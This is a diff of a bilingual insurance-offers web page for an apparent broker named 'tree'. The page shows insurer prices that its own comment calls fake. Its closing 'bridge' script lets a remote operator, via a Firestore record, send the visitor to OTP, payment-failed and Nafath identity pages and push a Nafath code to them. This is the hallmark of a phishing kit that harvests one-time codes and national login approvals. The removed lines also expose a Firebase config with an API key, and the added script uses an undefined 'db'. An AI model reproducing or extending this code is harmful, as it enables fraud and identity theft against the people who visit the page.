@@ -6,168 +6,204 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>عروض التأمين | Insurance Offers</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <style>
-        .loader { text-align: center; padding: 40px; color: var(--text-muted); }
-        .loader .spin-ring { margin-bottom: 16px; }
+        .navbar { margin-bottom: 30px; }
+        .nav-logo { height: 40px; }
+        .form-wrapper { max-width: 800px; margin: 0 auto 40px; padding: 30px; border-radius: var(--tree-radius-lg); }
+        .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; font-size: 0.9rem; }
+        .step { text-align: center; flex: 1; position: relative; }
+        .step.active { font-weight: bold; }
+        .step-icon { width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; }
+        .offer-card {
+            padding: 20px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between;
+            transition: transform 0.2s, box-shadow 0.2s; border-radius: var(--tree-radius);
+        }
+        .company-name { font-weight: bold; font-size: 1.2rem; margin-bottom: 5px; }
+        .price-tag { font-size: 1.5rem; font-weight: bold; }
+        .price-currency { font-size: 0.9rem; font-weight: normal; }
+        .btn-select { padding: 8px 25px; border-radius: 10px; border: none; }
+        .company-logo {
+            width: 60px; height: 60px; object-fit: contain;
+            margin-inline-start: 15px; border-radius: 8px;
+            border: 1px solid var(--tree-border);
+        }
+        .site-footer { padding: 20px 0; margin-top: auto; text-align: center; font-size: 0.8rem; }
     </style>
 </head>
-<body>
+<body class="tree-site page-offers">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="inner-nav">
-    <a href="index.html" class="inner-nav__logo">tree</a>
-    <div class="inner-nav__right">
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
-    </div>
-</nav>
-
-<div class="page-wrap">
-
-    <!-- Steps -->
-    <div class="steps-bar" style="width:100%;max-width:800px;">
-        <div class="step-item done">
-            <div class="step-circle">✔</div>
-            <div class="step-label" data-i18n="steps.data">البيانات</div>
+<div class="wrapper">
+    <!-- Navbar -->
+    <nav class="navbar navbar-light">
+        <div class="container d-flex justify-content-between align-items-center">
+            <a class="navbar-brand" href="#"><img src="images/logo.png" class="nav-logo" alt="Tree" onerror="this.src='https://placehold.co/110x36/198754/ffffff?text=TREE'"></a>
+            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
         </div>
-        <div class="step-item active">
-            <div class="step-circle">2</div>
-            <div class="step-label" data-i18n="steps.prices">قائمة الأسعار</div>
-        </div>
-        <div class="step-item">
-            <div class="step-circle">3</div>
-            <div class="step-label" data-i18n="steps.summary">الملخص والدفع</div>
-        </div>
-    </div>
+    </nav>
 
-    <div class="teal-card teal-card--wide" style="margin-top:24px;">
-        <div class="card-head">
-            <div class="section-title" data-i18n="offers.title">اختر العرض الأنسب لك</div>
-        </div>
-        <div class="card-body">
-
-            <!-- Type filter -->
-            <div class="type-filter">
-                <button class="type-filter__btn active" id="btn-tpl" onclick="startFilter('tpl')" data-i18n="ins.tpl">ضد الغير</button>
-                <button class="type-filter__btn" id="btn-comp" onclick="startFilter('comp')" data-i18n="ins.comp">شامل</button>
+<div class="container">
+    <div class="form-wrapper">
+        
+        <!-- شريط الخطوات -->
+        <div class="step-indicator">
+            <div class="step active">
+                <div class="step-icon">✔</div>
+                <span data-i18n="steps.data">البيانات</span>
             </div>
-
-            <div id="loader" class="loader" style="display:none;">
-                <div class="spin-ring"></div>
-                <p data-i18n="offers.searching">جاري البحث عن أفضل العروض...</p>
+            <div class="step active">
+                <div class="step-icon">2</div>
+                <span data-i18n="steps.prices">قائمة الأسعار</span>
             </div>
-
-            <div id="offersList"></div>
-
+            <div class="step">
+                <div class="step-icon">3</div>
+                <span data-i18n="steps.summary">الملخص والدفع</span>
+            </div>
         </div>
-    </div>
 
-    <div class="inner-footer" data-i18n="offers.footer">© 2024 تري لوساطة التأمين</div>
+        <h2 class="text-center mb-4 fw-bold" data-i18n="offers.title">اختر العرض الأنسب لك</h2>
+
+        <!-- فلتر نوع التأمين -->
+        <div class="d-flex justify-content-center mb-4">
+            <div class="btn-group" role="group">
+                <input type="radio" class="btn-check" name="typeFilter" id="tplFilter" autocomplete="off" checked onchange="startFilter('tpl')">
+                <label class="btn btn-outline-success px-5 py-2 fw-bold" for="tplFilter" data-i18n="ins.tpl">ضد الغير</label>
+
+                <input type="radio" class="btn-check" name="typeFilter" id="compFilter" autocomplete="off" onchange="startFilter('comp')">
+                <label class="btn btn-outline-success px-5 py-2 fw-bold" for="compFilter" data-i18n="ins.comp">شامل</label>
+            </div>
+        </div>
+
+        <div id="loader" style="display: none;">
+            <div class="spinner"></div>
+            <p class="text-muted" data-i18n="offers.searching">جاري البحث عن أفضل العروض...</p>
+        </div>
+
+        <div id="offersList">
+            <!-- سيتم تعبئة العروض هنا عبر الجافاسكربت -->
+        </div>
+
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="site-footer">
+    <div class="container"><p class="m-0" data-i18n="offers.footer">© 2024 تري لوساطة التأمين</p></div>
+</footer>
 </div>
 
 <script>
+    // بيانات العروض (وهمية للمحاكاة)
     const offersData = [
-        { company: "ولاء للتأمين", logo: "images/companies/walaa.png", tplPrice: 502, compPrice: 1850, rating: 4.5 },
+        { company: "ولاء للتأمين", logo: "images/companies/WALAA.png", tplPrice: 502, compPrice: 1850, rating: 4.5 },
         { company: "ميدغلف", logo: "images/companies/MEDGULF.png", tplPrice: 679, compPrice: 2100, rating: 4.0 },
         { company: "سلامة للتأمين", logo: "images/companies/SALAMA.png", tplPrice: 495, compPrice: 1750, rating: 3.8 },
         { company: "أسيج", logo: "images/companies/ACIG.png", tplPrice: 550, compPrice: 1900, rating: 4.2 },
-        { company: "التعاونية", logo: "images/companies/tawuniya.png", tplPrice: 850, compPrice: 2400, rating: 4.9 },
-        { company: "ملاذ للتأمين", logo: "images/companies/malath.png", tplPrice: 620, compPrice: 2050, rating: 4.1 },
-        { company: "تكافل الراجحي", logo: "images/companies/Al Rajhi Takaful.png", tplPrice: 590, compPrice: 1950, rating: 4.7 },
-        { company: "الدرع العربي", logo: "images/companies/Arabian Shield.png", tplPrice: 480, compPrice: 1700, rating: 3.9 },
-        { company: "أمانة للتأمين", logo: "images/companies/amana.png", tplPrice: 490, compPrice: 1720, rating: 3.7 },
-        { company: "الاتحاد للتأمين", logo: "images/companies/union.png", tplPrice: 530, compPrice: 1880, rating: 4.0 },
-        { company: "الخليجية العامة", logo: "images/companies/GULF GENERAL.png", tplPrice: 525, compPrice: 1840, rating: 3.8 },
-        { company: "واتانية", logo: "images/companies/Wataniya.png", tplPrice: 560, compPrice: 1920, rating: 4.1 }
+        { company: "التعاونية", logo: "images/companies/TAWUNIYA.png", tplPrice: 850, compPrice: 2400, rating: 4.9 },
+        { company: "ملاذ للتأمين", logo: "images/companies/MALATH.png", tplPrice: 620, compPrice: 2050, rating: 4.1 },
+        { company: "تكافل الراجحي", logo: "images/companies/RAJHI.png", tplPrice: 590, compPrice: 1950, rating: 4.7 },
+        { company: "الدرع العربي", logo: "images/companies/ARABIAN.png", tplPrice: 480, compPrice: 1700, rating: 3.9 },
+        { company: "أليانز", logo: "images/companies/ALLIANZ.png", tplPrice: 710, compPrice: 2200, rating: 4.3 },
+        { company: "الاتحاد للتأمين", logo: "images/companies/UNION.png", tplPrice: 530, compPrice: 1880, rating: 4.0 },
+        { company: "جي آي جي (GIG)", logo: "images/companies/GIG.png", tplPrice: 750, compPrice: 2300, rating: 4.6 },
+        { company: "أمانة للتأمين", logo: "images/companies/AMANA.png", tplPrice: 490, compPrice: 1720, rating: 3.7 },
+        { company: "بروج للتأمين", logo: "images/companies/BURUJ.png", tplPrice: 510, compPrice: 1800, rating: 3.9 },
+        { company: "الصقر للتأمين", logo: "images/companies/WALAA.png", tplPrice: 540, compPrice: 1860, rating: 3.8 },
+        { company: "المتحدة للتأمين", logo: "images/companies/TAWUNIYA.png", tplPrice: 560, compPrice: 1920, rating: 4.1 },
+        { company: "الخليجية العامة", logo: "images/companies/MEDGULF.png", tplPrice: 525, compPrice: 1840, rating: 3.8 },
+        { company: "العالمية", logo: "images/companies/SALAMA.png", tplPrice: 580, compPrice: 1980, rating: 4.0 }
     ];
 
     const offersList = document.getElementById('offersList');
     const loader = document.getElementById('loader');
-    let activeType = 'tpl';
 
     function startFilter(type) {
-        activeType = type;
-        document.getElementById('btn-tpl').classList.toggle('active', type === 'tpl');
-        document.getElementById('btn-comp').classList.toggle('active', type === 'comp');
-        offersList.style.opacity = '0.4';
+        offersList.style.opacity = '0.5';
         loader.style.display = 'block';
-        offersList.innerHTML = '';
+        offersList.innerHTML = ''; // مسح مؤقت
+        
+        // محاكاة تأخير بسيط للواقعية
         setTimeout(() => {
             renderOffers(type);
             loader.style.display = 'none';
             offersList.style.opacity = '1';
-        }, 700);
+        }, 800);
     }
 
     function renderOffers(type) {
-        offersList.innerHTML = '';
-        const sorted = [...offersData].sort((a, b) =>
-            type === 'tpl' ? a.tplPrice - b.tplPrice : a.compPrice - b.compPrice
-        );
-        sorted.forEach(offer => {
+        offersList.innerHTML = ""; // مسح القائمة الحالية
+        
+        // ترتيب العروض حسب السعر (من الأقل للأعلى)
+        const sortedOffers = [...offersData].sort((a, b) => {
+            return type === 'tpl' ? a.tplPrice - b.tplPrice : a.compPrice - b.compPrice;
+        });
+
+        sortedOffers.forEach(offer => {
             const price = type === 'tpl' ? offer.tplPrice : offer.compPrice;
             const typeText = type === 'tpl' ? t('ins.tpl') : t('ins.comp');
-            const stars = '⭐'.repeat(Math.floor(offer.rating));
+            const stars = "⭐".repeat(Math.floor(offer.rating));
 
             const card = document.createElement('div');
             card.className = 'offer-card';
             card.innerHTML = `
-                <div class="offer-card__left">
-                    <div class="company-bubble">
-                        <img src="${offer.logo}" alt="${offer.company}" onerror="this.onerror=null;this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(offer.company)}&background=0a3330&color=00e5a0&size=80&font-size=0.4'">
-                    </div>
+                <div class="d-flex align-items-center flex-grow-1">
+                    <img src="${offer.logo}" alt="${offer.company}" class="company-logo" onerror="console.error('❌ صورة مفقودة: ${offer.logo}'); this.onerror=null; this.src='https://ui-avatars.com/api/?name='+this.alt+'&background=random&color=fff&size=128&font-size=0.4'">
                     <div>
-                        <div class="offer-card__name">${offer.company}</div>
-                        <div class="offer-card__stars">${stars} (${offer.rating})</div>
-                        <div class="offer-card__features">
-                            <div class="offer-card__feature"><span>✔</span> ${t('offers.workshop')}</div>
-                            <div class="offer-card__feature"><span>✔</span> ${t('offers.roadside')}</div>
-                            ${type === 'comp' ? `<div class="offer-card__feature"><span>✔</span> ${t('offers.glass')}</div>` : ''}
+                        <div class="company-name">${offer.company}</div>
+                        <div class="text-warning small mb-1">${stars} (${offer.rating})</div>
+                        <span class="badge-type">${typeText}</span>
+                        
+                        <div class="feature-list">
+                            <div class="feature-item"><span class="text-success">✔</span> ${t('offers.workshop')}</div>
+                            <div class="feature-item"><span class="text-success">✔</span> ${t('offers.roadside')}</div>
+                            ${type === 'comp' ? `<div class="feature-item"><span class="text-success">✔</span> ${t('offers.glass')}</div>` : ''}
                         </div>
                     </div>
                 </div>
-                <div class="offer-card__right">
-                    <div class="offer-card__price">${price}</div>
-                    <div class="offer-card__sar">${t('offers.sar')}</div>
-                    <div class="offer-card__incl">${t('offers.incl_tax')}</div>
-                    <a href="policy_details.html?company=${encodeURIComponent(offer.company)}&price=${price}&type=${type}&logo=${encodeURIComponent(offer.logo)}" class="offer-buy-btn">${t('offers.buy_now')}</a>
+                <div class="text-end ps-3 border-start">
+                    <div class="price-tag">${price} <span class="price-currency">${t('offers.sar')}</span></div>
+                    <div class="text-muted small mb-2">${t('offers.incl_tax')}</div>
+                    <a href="policy_details.html?company=${encodeURIComponent(offer.company)}&price=${price}&type=${type}&logo=${encodeURIComponent(offer.logo)}" class="btn btn-select mt-2">${t('offers.buy_now')}</a>
                 </div>
             `;
             offersList.appendChild(card);
         });
     }
 
+    // التشغيل الأولي (عرض ضد الغير افتراضياً)
     startFilter('tpl');
-
-    (function() {
-        const firebaseConfig = {
-            apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
-            authDomain: "tameen-658e9.firebaseapp.com",
-            projectId: "tameen-658e9",
-            storageBucket: "tameen-658e9.firebasestorage.app",
-            messagingSenderId: "292670676256",
-            appId: "1:292670676256:web:3624157751cd194efe4b45"
-        };
-        if (typeof firebase !== 'undefined') {
-            try { firebase.initializeApp(firebaseConfig); } catch(e) {}
-            const db = firebase.firestore();
-            const userId = localStorage.getItem('user_id');
-            if (userId) {
-                db.collection("orders").doc(userId).onSnapshot((doc) => {
-                    if (doc.exists) {
-                        const data = doc.data();
-                        if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
-                        else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-                        else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
+    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp_verification.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_failed.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
                     }
-                });
+                }
             }
-        }
-    })();
+        });
+    }
+})();
+// ------------------------------------------
+
 </script>
+
 </body>
 </html>
